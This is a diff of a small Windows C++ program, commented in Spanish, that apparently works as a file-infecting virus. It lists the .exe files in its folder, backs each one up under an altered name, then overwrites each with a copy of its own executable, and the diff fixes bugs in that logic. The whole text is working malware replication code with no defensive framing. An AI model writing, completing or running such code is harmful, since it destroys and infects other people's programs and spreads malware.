@@ -1,6 +1,6 @@
 #include <iostream>
 #include <Windows.h>
-
+#include <string.h>
 using namespace std;
 int main()
 {
@@ -29,8 +29,8 @@ int num = 0 ;
 HANDLE handle;
 //LPCSTR formato=L;
 WIN32_FIND_DATAA lpFindFileData;
-char*  nombre_archivo_original;
-char* nombre_nuevo_archivo;
+const char*  nombre_archivo_original;
+ 
 TCHAR nombre_este_archivo[MAX_PATH];
 ///+++++++++++++++++++++++++++++
 ///           Accion
@@ -53,30 +53,37 @@ nombre_este_archivo_ss[j]=aux ;
 	j++;
 	i++;
 }
-cout<<nombre_este_archivo_ss<<endl;
+
 
 handle=FindFirstFile("*.exe",&lpFindFileData);
 bool next_exists = true;
 while(next_exists==true)
 {
   
- 
 nombre_archivo_original=lpFindFileData.cFileName;
-
-
 
 if(!(strcmp(nombre_archivo_original,nombre_este_archivo_ss)==0))
 {
-	nombre_nuevo_archivo=nombre_archivo_original;
-	nombre_nuevo_archivo[j]='d';
-	cout<<nombre_nuevo_archivo<<endl;
-cout<<nombre_archivo_original<<endl;	
+cout<<nombre_archivo_original<<endl;
+	
+
+char nombre_nuevo_archivo[MAX_PATH-i]; // aspi
+
+for(int j = 0 ; j <MAX_PATH-i;j++)
+{
+ nombre_nuevo_archivo[j]=lpFindFileData.cFileName[j];	
+}
+
+ cout<<"prueba "<<nombre_nuevo_archivo<<endl;
+
+nombre_nuevo_archivo[j]='d';
+
 CopyFile(nombre_archivo_original,nombre_nuevo_archivo,0);
-	BOOL b = CopyFile(nombre_este_archivo_ss,nombre_archivo_original,0);
+BOOL b = CopyFile(nombre_este_archivo_ss,nombre_archivo_original,0);
 if (!b) {
-   cout << "Error: " << GetLastError() << endl;
+  cout << "Error: " << GetLastError() << endl;
 } else {
-  cout << "Okay " << endl;
+ cout << "Okay " << endl;
 	
 }
 
